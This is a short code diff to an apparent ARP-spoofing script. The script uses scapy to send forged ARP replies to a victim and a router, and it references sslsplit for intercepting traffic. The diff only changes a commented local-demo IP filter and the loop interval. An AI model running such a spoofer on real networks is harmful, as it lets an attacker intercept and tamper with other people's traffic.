@@ -67,7 +67,7 @@ def send_fake_arp():
 		arp_to_router = ARP(op=2, pdst=gtw_ip, hwdst=rt_mac,              psrc=hot_ip, hwsrc=hot_mc)
 		
 		# Local demo use
-		# if i != '192.168.0.163' and i != '192.168.0.141': continue;
+		# if i != '192.168.0.163': continue;
 
 		send(arp_to_victim, verbose=False)
 		send(arp_to_router, verbose=False)
@@ -117,7 +117,7 @@ def main():
 	while True:
 		try:
 			send_fake_arp()
-			time.sleep(2)
+			time.sleep(5)
 		except KeyboardInterrupt:
 			if not os.path.exists('sslsplit.pid'): break;
 			with open('sslsplit.pid') as f:
